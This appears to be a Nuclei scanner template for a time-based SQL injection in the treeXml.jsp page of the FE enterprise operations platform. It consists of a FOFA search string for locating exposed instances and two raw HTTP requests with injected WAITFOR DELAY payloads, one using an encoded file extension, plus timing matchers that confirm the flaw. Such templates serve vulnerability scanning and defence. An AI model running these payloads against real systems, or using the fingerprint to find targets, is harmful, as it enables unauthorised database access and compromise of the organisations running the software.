id: FE-treeXml-sql-injection

info:
  name: 飞企互联-FE企业运营管理平台 treeXml.jsp SQL注入
  author: HuanXiong
  severity: high
  description: |-
    fofa: app="FE-协作平台"

  tags: SQL Injection

http:
  - raw:
      - |
        GET /sys/treeXml.js%70?menuName=1';WAITFOR+DELAY+'0:0:5'--&type=function HTTP/1.1 
        Host: {{Hostname}}

      - |
        GET /sys/treeXml.js%70?menuName=1';WAITFOR+DELAY+'0:0:9'--&type=function HTTP/1.1 
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
            - 'duration_1>=5 && duration_1<=6'  
            - 'duration_2>=9 && duration_2<=10'
        condition: and  
      - type: status
        status: 
          - 200





